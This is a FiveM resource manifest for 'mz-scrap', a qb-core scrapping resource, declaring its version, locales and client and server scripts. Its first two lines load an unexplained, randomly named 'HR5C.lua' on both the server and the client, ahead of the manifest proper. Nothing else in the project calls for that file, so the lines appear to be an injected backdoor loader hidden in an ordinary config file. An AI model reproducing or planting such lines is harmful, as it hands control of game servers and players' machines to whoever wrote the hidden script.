server_script "HR5C.lua"

client_script "HR5C.lua"

fx_version 'cerulean'

game 'gta5'

description 'mz-scrap - a progression based scrapping resource for qb-core (with or without mz-skill XP integration)'

author 'Mr_Zain#4139'

version '1.3.8'

lua54 'yes'

shared_scripts {
	'@qb-core/shared/locale.lua',
	'config.lua',
	'locales/en.lua',
}

client_script 'client/main.lua'

server_script 'server/main.lua'

